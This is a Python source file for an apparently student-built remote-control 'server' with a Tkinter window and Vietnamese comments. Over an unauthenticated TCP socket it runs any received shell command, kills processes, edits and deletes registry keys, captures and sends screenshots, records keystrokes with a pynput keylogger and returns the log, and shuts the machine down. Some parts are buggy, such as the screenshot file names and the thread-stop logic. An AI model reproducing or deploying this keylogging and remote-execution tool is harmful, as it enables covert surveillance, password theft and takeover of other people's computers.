from pynput.keyboard import Listener
from tkinter import *
from tkinter import messagebox
from tkinter import filedialog
from tkinter.filedialog import*
from tkinter import ttk
import logging
import time
import threading
import wx
import ntpath
import winreg
import pyautogui
import socket
import psutil
import os
import subprocess
import sys
import imutils
import pyautogui
import cv2
import io
import base64
import PIL.Image as Image
from PIL import ImageGrab

window = Tk()
window.title('Sever')
window.geometry('200x88')

def butOpenServer_Click():
    PORT = 5656
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((socket.gethostname(), PORT))
        s.listen(1)
        print("HOST: ", s.getsockname())
        conn, addr = s.accept()
        with conn:
            print('Connected by', addr)
            while True:
                data = conn.recv(1024)
                if data == b"kill": 
                    pid1= conn.recv(1024)
                    pid= pid1.decode('utf-8')
                    os.system("taskkill /f /im "+ str(pid))
                elif data == b"open":
                    name1= conn.recv(1024)
                    name= name1.decode('utf-8')
                    os.system(name)
                #process running
                elif data == b"runningPro":
                    output = os.popen('wmic process get description, processid').read()
                    output_byt = output.encode()
                    conn.sendall(output_byt)
                #app running
                elif data == b"runningApp":
                    string_list=""
                    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id,Path'
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                    for line in proc.stdout:
                        if not line.decode()[0].isspace():
                           string_list += line.decode()
                    text = string_list.encode()
                    conn.sendall(text)
                #sua registry
                elif data == b"RegistryFile":
                    global pathReg1Str, pathReg2, nameRegChange, valueRegChange, dataChange
                    content = conn.recv(1024)
                    conn.sendall(b"Ok")
                    content = content.decode('utf-8')
                    content = content.replace("[","")
                    content = content.replace("]","")
                    content = content.replace('"','')
                    contentLine = content.splitlines()
                    line1 = contentLine[1]
                    line2 = contentLine[2]
                    line1Arr = os.path.split(line1)
                    line2Arr = line2.split('=')
                    pathReg1Str = line1Arr[0]
                    pathReg2 = line1Arr[1]
                    nameRegChange = line2Arr[0]
                    valueRegChange = line2Arr[1]
                    dataChange = "String"
                    getPathReg1()
                    setValueRegistry()
                elif data == b"RegistryDirect":
                    mustDo = conn.recv(1024) # nhan mustDo
                    mustDo = mustDo.decode('utf-8')
                    conn.sendall(b"Ok")
                    pathReg1Str = conn.recv(1024)#nhan path 1
                    conn.sendall(b"Ok")
                    pathReg1Str = pathReg1Str.decode('utf-8')
                    getPathReg1()
                    pathReg2 = conn.recv(1024)#nhan path 2
                    conn.sendall(b"Ok")
                    pathReg2 = pathReg2.decode('utf-8')
                    if mustDo == "1":
                        global nameFinding
                        nameFinding = conn.recv(1024)#nhan nameFiding
                        conn.sendall(b"Ok")
                        nameFinding = nameFinding.decode('utf-8')
                        valueReg = getValueRegistry()
                        byt_valueReg = str(valueReg).encode()
                        buffData = conn.recv(1024)
                        conn.sendall(byt_valueReg)#gui data ve client
                    elif mustDo == "2":
                        nameRegChange = conn.recv(1024)
                        conn.sendall(b"Ok")
                        nameRegChange = nameRegChange.decode('utf-8')
                        valueRegChange = conn.recv(1024)
                        conn.sendall(b"Ok")
                        valueRegChange = valueRegChange.decode('utf-8')
                        dataChange = conn.recv(1024)
                        conn.sendall(b"Ok")
                        dataChange = dataChange.decode('utf-8')
                        setValueRegistry()
                        conn.recv(1024)
                        conn.sendall("Set value thành công".encode())
                    elif mustDo == "3":
                        global valueDelete
                        valueDelete = conn.recv(1024)
                        valueDelete = valueDelete.decode('utf-8')
                        deleteValue()
                        conn.sendall("Xoá value thành công".encode())
                    elif mustDo == "4":
                        buffData = conn.recv(1024)
                        try:
                            createKey()
                            conn.sendall("Tạo key thành công".encode())
                        except:
                             conn.sendall("Tạo key không thành công".encode())
                    elif mustDo == "5":
                        buffData = conn.recv(1024)
                        try:
                            deleteKey()
                            conn.sendall("Xoá key thành công".encode())
                        except:
                            conn.sendall("Xoá key không thành công".encode())
                #chup man hinh
                elif data==b"shoot":
                    app=[]; app = wx.App(None) # Need to create an App instance before doing anything
                    screen = wx.ScreenDC()
                    size = screen.GetSize()
                    bmp = wx.Bitmap(size[0], size[1])
                    mem = wx.MemoryDC(bmp)
                    mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
                    del mem  # Release bitmap
                    bmp.SaveFile('screenshotSever.png', wx.BITMAP_TYPE_PNG)
                    fileName="screenshot.png"
                    imageFile = open(fileName, "rb")
                    imageData=imageFile.read(1024)
                    while (imageData):
                        conn.sendall(imageData)
                        buff = conn.recv(1024)
                        imageData=imageFile.read(1024)
                        if imageData == b'':
                            conn.sendall(b'stop')
                            break
                    imageFile.close()
                #keylog
                elif data==b"HOOK":
                        global stop_threads,t
                        stopThreads = False
                        t = threading.Thread(target= getlog,args=(lambda : stopThreads, ))
                        t.start()
                        with open("keyLog1.txt","w") as f:
                            f.write("")
                elif data==b"UNHOOK":
                        stopThreads = True
                        t.join() 
                        with open("keyLog1.txt","w") as f:
                            f.write("")
                elif data==b"PRINT":
                        with open("keyLog1.txt","r") as f:
                            temp = f.read()
                        with open("keyLog1.txt","w") as f:
                            f.write("")
                        if temp == "":
                            temp = "\0"
                        temp=temp.encode('utf-8')
                        conn.send(temp)
                elif data==b"SHUTDOWN":
                    os.system("shutdown /s /t 1")
                elif data==b"runningApp":
                    string_list=""
                    count=1
                    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description,Id,Path'
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                    for line in proc.stdout:
                        if not line.decode()[0].isspace():
                           string_list += line.decode()
                           count +=1
                    text=string_list.encode()
                    conn.sendall(text)
                elif data == b"QUIT":
                    s.close()
                    sys.exit(0)
                    break
    finally:
        s.close()
        sys.exit(0)

butOpenServer = Button(window, text = 'Mở server', fg = "black", bg = "white",command = butOpenServer_Click)
butOpenServer.grid(padx = 70, pady = 30)

def getlog(stop):
    def on_press(key):
        # print('{0} pressed'.format(key))
        return 
    def writeFile(key):
        with open("keyLog1.txt","a") as f:
            k= str(key).replace("'","") 
            if k.find("backspace") > 0:
                f.write("Backspace")
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("Enter\n")
            elif k.find("tab") > 0:
                f.write("Tab\t")
            elif k.find("x") > 0:
                f.write("")
            elif k.find("Key") == -1:
                f.write(k)  
    
    def on_release(key):
        if key:
            writeFile(key) 
            return False
    while True:
        with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()
        if stop():
            break

def getPathReg1():
    global pathReg1
    if pathReg1Str == "HKEY_CURRENT_USER":
        pathReg1 = winreg.HKEY_CURRENT_USER
    elif pathReg1Str == "HKEY_CLASSES_ROOT":
        pathReg1 = winreg.HKEY_CLASSES_ROOT
    elif pathReg1Str == "HKEY_CURRENT_CONFIG":    
        pathReg1 = winreg.HKEY_CURRENT_CONFIG
    elif pathReg1Str == "HKEY_USERS":    
        pathReg1 = winreg.HKEY_USERS
    elif pathReg1Str == "HKEY_LOCAL_MACHINE":    
        pathReg1 = winreg.HKEY_LOCAL_MACHINE

def getIndexByNameReg():
    with winreg.ConnectRegistry(None, pathReg1) as hkey:
        with winreg.OpenKey(hkey, pathReg2, 0, winreg.KEY_ALL_ACCESS) as sub_key:
            i = 0
            while i < 100:
                nameReg = winreg.EnumValue(sub_key, i)[0]
                if nameReg == nameFinding:
                    return i

def getValueRegistry():
    index = getIndexByNameReg()
    with winreg.ConnectRegistry(None, pathReg1) as hkey:
        with winreg.OpenKey(hkey, pathReg2, 0, winreg.KEY_ALL_ACCESS) as sub_key:
            valueReg = winreg.EnumValue(sub_key, 0)[1]
    return valueReg

def setValueRegistry():
    global typeReg
    typeReg = None
    if dataChange == "String":
        typeReg = winreg.REG_SZ
    elif dataChange == "Binary":
        typeReg = winreg.REG_BINARY
    elif dataChange == "DWORD":
        typeReg = winreg.REG_DWORD
    elif dataChange == "Multi String":
        typeReg = winreg.REG_MULTI_SZ
    elif dataChange == "Expandle String":
        typeReg = winreg.REG_EXPAND_SZ    
    with winreg.ConnectRegistry(None, pathReg1) as hkey:
        with winreg.OpenKey(hkey, pathReg2, 0, winreg.KEY_ALL_ACCESS) as sub_key:
            winreg.SetValueEx(sub_key, nameRegChange, 0, typeReg, valueRegChange)

def deleteValue():
    with winreg.ConnectRegistry(None, pathReg1) as hkey:
        with winreg.OpenKey(hkey, pathReg2, 0, winreg.KEY_ALL_ACCESS) as sub_key: 
            winreg.DeleteValue(sub_key, valueDelete)

def createKey():
    with winreg.ConnectRegistry(None, pathReg1) as hkey:
        winreg.CreateKey(hkey, pathReg2)
def deleteKey():
    with winreg.ConnectRegistry(None, pathReg1) as hkey:
        winreg.DeleteKey(hkey, pathReg2)

window.mainloop()